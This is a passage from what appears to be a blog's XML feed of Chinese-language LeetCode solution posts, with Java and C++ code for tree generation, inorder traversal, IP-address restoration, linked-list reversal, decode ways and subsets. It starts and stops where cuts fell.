<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [1,null,3,2],</span><br><span class="line">  [3,2,null,1],</span><br><span class="line">  [3,1,null,null,2],</span><br><span class="line">  [2,1,3],</span><br><span class="line">  [1,null,2,null,3]</span><br><span class="line">]</span><br><span class="line">Explanation:</span><br><span class="line">The above output corresponds to the 5 unique BST&apos;s shown below:</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       /     /      / \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    /     /       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>如果理解了LeetCode 96. Unique Binary Search Trees的话，这道题目的思路肯定是有的，关键是注意具体的实现细节。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;TreeNode&gt; <span class="title">generateTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] nodeVals = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        nodeVals[i] = i + <span class="number">1</span>;</span><br><span class="line">    List&lt;TreeNode&gt; res = constructBinarySearchTree(nodeVals, <span class="number">0</span>, n);</span><br><span class="line">    <span class="keyword">return</span> res;    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;TreeNode&gt; <span class="title">constructBinarySearchTree</span><span class="params">(<span class="keyword">int</span>[] nodeVals, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">    List&lt;TreeNode&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="comment">// null</span></span><br><span class="line">    <span class="keyword">if</span> (start &gt;= end) <span class="keyword">return</span> list;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只有根节点</span></span><br><span class="line">    <span class="keyword">if</span> (start + <span class="number">1</span> == end) &#123; list.add(<span class="keyword">new</span> TreeNode(nodeVals[start])); <span class="keyword">return</span> list; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 完全在右边</span></span><br><span class="line">    <span class="keyword">for</span> (TreeNode rightNode : constructBinarySearchTree(nodeVals, start + <span class="number">1</span>, end)) &#123;</span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(nodeVals[start]);</span><br><span class="line">        root.left = <span class="keyword">null</span>;</span><br><span class="line">        root.right = rightNode;</span><br><span class="line">        list.add(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 完全在左边</span></span><br><span class="line">    <span class="keyword">for</span> (TreeNode leftNode : constructBinarySearchTree(nodeVals, start, end - <span class="number">1</span>)) &#123;</span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(nodeVals[end - <span class="number">1</span>]);</span><br><span class="line">        root.left = leftNode;</span><br><span class="line">        root.right = <span class="keyword">null</span>;</span><br><span class="line">        list.add(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 左右都有</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = start + <span class="number">1</span>; i &lt; end - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (TreeNode leftNode : constructBinarySearchTree(nodeVals, start, i)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (TreeNode rightNode : constructBinarySearchTree(nodeVals, i + <span class="number">1</span>, end)) &#123;</span><br><span class="line">                TreeNode root = <span class="keyword">new</span> TreeNode(nodeVals[i]);</span><br><span class="line">                root.left = leftNode;</span><br><span class="line">                root.right = rightNode;</span><br><span class="line">                list.add(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[94. Binary Tree Inorder Traversal]]></title>
      <url>/wiki/2017/10/30/Leetcode-94-Binary-Tree-Inorder-Traversal/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, return the inorder traversal of its nodes’ values.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [1,3,2]</span><br></pre></td></tr></table></figure>
<p>Follow up: Recursive solution is trivial, could you do it iteratively?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目和144. Binary Tree Preorder Traversal一摸一样，给出三种方案：</p>
<p>有帮助函数的递归，省去了反复要生成List<Integer>.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    inorderTraversalHelper(root, list);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inorderTraversalHelper</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    inorderTraversalHelper(root.left, list);</span><br><span class="line">    list.add(root.val);</span><br><span class="line">    inorderTraversalHelper(root.right, list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接递归</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> list;</span><br><span class="line">    list.addAll(inorderTraversal(root.left));</span><br><span class="line">    list.add(root.val);</span><br><span class="line">    list.addAll(inorderTraversal(root.right));</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>迭代</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">    TreeNode cur = root;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span> || !stack.isEmpty()) &#123; </span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123; </span><br><span class="line">            <span class="comment">// Travel to each node's left child,</span></span><br><span class="line">            <span class="comment">// till reach the left leaf</span></span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;				</span><br><span class="line">        &#125;		 </span><br><span class="line">        cur = stack.pop(); <span class="comment">// Backtrack to higher level node A</span></span><br><span class="line">        res.add(cur.val);  <span class="comment">// Add the node to the result list</span></span><br><span class="line">        cur = cur.right;   <span class="comment">// Switch to A'right branch</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Stack </tag>
            
            <tag> HashTable </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[93. Restore IP Addresses]]></title>
      <url>/wiki/2017/10/30/Leetcode-93-Restore-IP-Addresses/</url>
      <content type="html"><![CDATA[<p>Given a string containing only digits, restore it by returning all possible valid IP address combinations.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;25525511135&quot;</span><br><span class="line">Output: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;]</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>要求根据给定字符串，返回有效的IP地址。使用回溯法是非常显而易见的。但是这道题目有几个trick：</p>
<ol>
<li>每个点号分隔的区间表示的数字在0～255之间，然而像012这样的数字是错误的，不能在前面有0。如果允许的话，12和012是重复的，ip地址不唯一。</li>
<li>为了表示ip地址，只需要记录下点号的位置即可，如果将原字符串频繁的插入、删除点号，那么每次插入和删除的最坏时间复杂度将会是$O(n)$，其中$n$是字符串长度，显然是不实际的。</li>
<li>确认剩下的字符串长度能够有效表示ip地址，可以加快回溯。</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;String&gt; ipAddresses;</span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">restoreIpAddresses</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    ipAddresses = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    LinkedList&lt;Integer&gt; dotPosition = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    restoreIpAddressesHelper(s, dotPosition, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ipAddresses;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">restoreIpAddressesHelper</span><span class="params">(String s, LinkedList&lt;Integer&gt; dotPosition, <span class="keyword">int</span> sep)</span></span>&#123;</span><br><span class="line">    <span class="comment">// check if have valid solution: remaining length is larger than capacity</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="number">4</span> - dotPosition.size()) * <span class="number">3</span> &lt; s.length() - sep) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (dotPosition.size() == <span class="number">3</span> &amp;&amp; validSubIP(s, sep, s.length())) &#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(s);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) sb.insert(dotPosition.get(i) + i, <span class="string">"."</span>);</span><br><span class="line">        ipAddresses.add(sb.toString());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> (validSubIP(s, sep, sep + i)) &#123;</span><br><span class="line">            dotPosition.addLast(sep + i);</span><br><span class="line">            restoreIpAddressesHelper(s, dotPosition, sep + i);</span><br><span class="line">            dotPosition.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if a part of ip address is valid: in the range of 0 ~ 255</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">validSubIP</span><span class="params">(String s, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// check if start, end is in the range of (0, s.length())</span></span><br><span class="line">    <span class="keyword">if</span> (start &lt; <span class="number">0</span> || end &gt; s.length()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// check length</span></span><br><span class="line">    <span class="keyword">int</span> len = end - start;</span><br><span class="line">    <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> || len &gt; <span class="number">3</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// check any leading 0: for example 015 is invalid</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">1</span> &amp;&amp; s.charAt(start) == <span class="string">'0'</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">3</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">return</span> s.substring(start, end).compareTo(<span class="string">"256"</span>) &lt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[93. Restore IP Adress]]></title>
      <url>/wiki/2017/10/30/Leetcode-93-Restore-IP-Adress/</url>
      <content type="html"><![CDATA[<p>Given a string containing only digits, restore it by returning all possible valid IP address combinations.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;25525511135&quot;</span><br><span class="line">Output: [&quot;255.255.11.135&quot;, &quot;255.255.111.35&quot;]</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[92. Reverse Linked List II]]></title>
      <url>/wiki/2017/10/30/Leetcode-92-Reverse-Linked-List-II/</url>
      <content type="html"><![CDATA[<p>Reverse a linked list from position m to n. Do it in one-pass.</p>
<p>Note: $1 \le m \le n \le$ length of list.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4</span><br><span class="line">Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>类似反转链表在LeetCode中题目有很多，例如LeetCode 25. Reverse Nodes in k-Group, LeetCode 206. 206. Reverse Linked List。题目要求一次性反转链表的一部分。这道题目考查的还是链表的基本操作。方法是相当直接的。唯一需要注意的是如果要求反转的部分包括链表头部，那么肯定需要加入一个虚拟的节点在链表头部前。基本操作是</p>
<ol>
<li>找到起始点</li>
<li>从起始点开始到结束点，后面的节点都指向前面的节点</li>
<li>把起始点和结束点指向正确位置</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseBetween</span><span class="params">(ListNode head, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m == n) <span class="keyword">return</span> head;</span><br><span class="line">    ListNode prev = <span class="keyword">new</span> ListNode(-<span class="number">1</span>), next = <span class="keyword">null</span>; <span class="comment">// previously/next visted ListNode</span></span><br><span class="line">    ListNode start, end; <span class="comment">// the start/end of reverse-part linked list</span></span><br><span class="line">    ListNode cur = prev, root = cur;</span><br><span class="line"></span><br><span class="line">    cur.next = head; <span class="comment">// add dummy node;</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">// index</span></span><br><span class="line">    <span class="comment">// find the start of the reserve-part linked list</span></span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i++ == m) <span class="keyword">break</span>;</span><br><span class="line">        prev = cur;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    &#125;</span><br><span class="line">    start = prev; <span class="comment">// the start posiiton of reverse-part linked list</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// reverse the linked list between m to n</span></span><br><span class="line">    <span class="comment">// Output: 1-&gt;2&lt;-3&lt;-4 5-&gt;NULL, m = 2, n = 4</span></span><br><span class="line">    prev = cur;</span><br><span class="line">    cur = cur.next; <span class="comment">// remove to next node</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= n) &#123;</span><br><span class="line">        next = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        prev = cur;</span><br><span class="line">        cur = next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    end = prev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reverse m -- n : the endpoint part</span></span><br><span class="line">    <span class="comment">// Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</span></span><br><span class="line">    start.next.next = next;</span><br><span class="line">    start.next = end;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[91. Decode Ways]]></title>
      <url>/wiki/2017/10/30/Leetcode-91-Decode-Ways/</url>
      <content type="html"><![CDATA[<p>A message containing letters from <code>A-Z</code> is being encoded to numbers using the following mapping:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;A&apos; -&gt; 1</span><br><span class="line">&apos;B&apos; -&gt; 2</span><br><span class="line">...</span><br><span class="line">&apos;Z&apos; -&gt; 26</span><br></pre></td></tr></table></figure>
<p>Given a <strong>non-empty</strong> string containing only digits, determine the total number of ways to decode it.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;12&quot;</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: It could be decoded as &quot;AB&quot; (1 2) or &quot;L&quot; (12).</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;226&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: It could be decoded as &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), or &quot;BBF&quot; (2 2 6).</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目要求解码的方法数目，是典型的动态规划题目。题目虽然不难，但是坑真的比较多。 第一个坑是需要单独把前两个提前计算，因为不能包括在状态方程里，而这个计算稍微复杂了点，容易出错。第二个坑，是个大坑，就是出现‘0’。‘0’可能出现在任意位置，所以每次都要检验。总体来说不难，需要特别细心。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = s.length();</span><br><span class="line">    <span class="comment">// check 0</span></span><br><span class="line">    <span class="keyword">if</span> (s.charAt(<span class="number">0</span>) == <span class="string">'0'</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// num[i]代表第i个字符到结尾组成的字符串有解码方案的种数。</span></span><br><span class="line">    <span class="keyword">int</span>[] num = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    num[n - <span class="number">1</span>] = (s.charAt(n - <span class="number">1</span>) == <span class="string">'0'</span>) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">    num[n - <span class="number">2</span>] = (s.charAt(n - <span class="number">2</span>) == <span class="string">'0'</span>) ? <span class="number">0</span> :</span><br><span class="line">        (num[n - <span class="number">1</span>] + (s.substring(n - <span class="number">2</span>, n).compareTo(<span class="string">"26"</span>) &lt;= <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.charAt(i) == <span class="string">'0'</span>) <span class="keyword">continue</span>;</span><br><span class="line">        num[i] = (s.substring(i, i + <span class="number">2</span>).compareTo(<span class="string">"26"</span>) &lt;= <span class="number">0</span>) ? </span><br><span class="line">            num[i + <span class="number">1</span>] + num[i + <span class="number">2</span>] : num[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num[<span class="number">0</span>]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[90. Subsets II]]></title>
      <url>/wiki/2017/10/30/Leetcode-90-Subsets-II/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a collection of integers that might contain duplicates, <strong>nums</strong>, return all possible subsets (the power set).</p>
<p>Note: The solution set must not contain duplicate subsets.</p>
<p>Example:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [<span class="number">2</span>],</span><br><span class="line">  [<span class="number">1</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>],</span><br><span class="line">  [<span class="number">2</span>,<span class="number">2</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">2</span>],</span><br><span class="line">  []</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题目与Leetcode 78. Subsets的唯一不同点为给的整数有可能出现重复。其实和40. Combination Sum II、47. Permutations II的处理技巧相同：先排序，然后直接跳过重复的元素。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; subsetsWithDup(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;nums) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">        sort(nums.begin(), nums.end());</span><br><span class="line">        subsetsWithDupHelper(res, nums, nums.size(), vec, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">subsetsWithDupHelper</span><span class="params">(<span class="built_in">vector</span>&lt;<span 